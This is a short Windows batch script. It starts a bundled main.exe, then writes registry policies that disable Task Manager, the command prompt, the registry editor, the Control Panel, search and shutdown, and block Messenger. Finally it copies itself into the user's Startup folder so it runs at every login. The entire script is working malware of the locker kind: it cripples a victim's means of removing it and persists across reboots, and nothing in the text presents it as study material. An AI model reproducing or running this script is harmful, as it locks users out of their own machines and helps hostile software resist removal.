@echo off

start %~dp0/main.exe

REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG ADD HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f

REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

REG ADD HKCU\Software\Policies\Microsoft\Messenger\Client /v PreventRun /t REG_DWORD /d 1 /f

REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f

REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f

copy "%~dp0\%~nx0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
